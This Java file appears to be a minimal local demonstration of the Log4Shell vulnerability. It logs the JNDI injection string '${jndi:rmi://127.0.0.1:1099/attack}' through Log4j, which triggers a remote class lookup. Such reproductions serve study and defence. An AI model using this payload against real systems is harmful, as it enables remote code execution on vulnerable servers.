package com.example;

import java.util.ArrayList;
import java.util.List;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Client {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main( String[] args) {
        Client client = new Client();
        client.query("${jndi:rmi://127.0.0.1:1099/attack}");
    }

    public List<Object> query(String id) {
        // 打印一下接口入参
        LOGGER.info("param: {}", id);
        // 执行一些查询逻辑
        List<Object> resList = new ArrayList();
        return resList;
    }
}
